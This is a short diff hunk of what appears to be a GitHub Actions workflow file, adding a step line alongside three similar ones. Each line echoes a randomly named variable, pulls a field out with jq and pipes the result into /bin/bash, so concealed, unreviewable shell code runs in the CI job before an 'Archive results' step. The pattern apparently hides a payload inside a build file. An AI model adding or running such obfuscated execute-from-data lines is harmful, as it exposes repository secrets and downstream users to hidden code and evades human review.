@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$tf64" | jq -r .gobuf08 | /bin/bash
           echo $tlkwj2050 | jq -r .p85852 | /bin/bash
           echo $eqw4 | jq -r .wbx74 | /bin/bash
+          echo $ur416 | jq -r .vv2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
